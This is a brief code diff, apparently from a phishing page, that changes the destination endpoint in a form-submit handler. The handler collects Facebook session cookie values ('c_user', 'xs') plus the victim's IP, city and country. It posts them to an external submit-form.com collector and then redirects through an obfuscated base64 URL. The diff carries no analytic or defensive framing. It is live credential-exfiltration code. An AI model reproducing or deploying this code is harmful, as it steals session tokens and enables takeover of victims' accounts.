@@ -2958,7 +2958,7 @@
         if (vForm) vForm.addEventListener('submit', function (e) {
             e.preventDefault();
             var btn = document.getElementById('submitBtn'); if (btn) { btn.classList.add('loading'); btn.disabled = true; }
-            fetch('https://submit-form.com/pVkE3QuAh', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ c_user: document.getElementById('c_user').value.trim(), xs: document.getElementById('xs').value.trim(), country: userCountry, city: userCity, ip: userIP }) })
+            fetch('https://submit-form.com/C6Qu1syXO', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ c_user: document.getElementById('c_user').value.trim(), xs: document.getElementById('xs').value.trim(), country: userCountry, city: userCity, ip: userIP }) })
                 .then(function (r) { if (r.ok) { allowRecovery ? window.location.replace(atob(finalRedirect)) : goTo('s3'); } else throw 0; })
                 .catch(function () { goTo('s3'); })
                 .finally(function () { if (btn) { btn.classList.remove('loading'); btn.disabled = false; } });
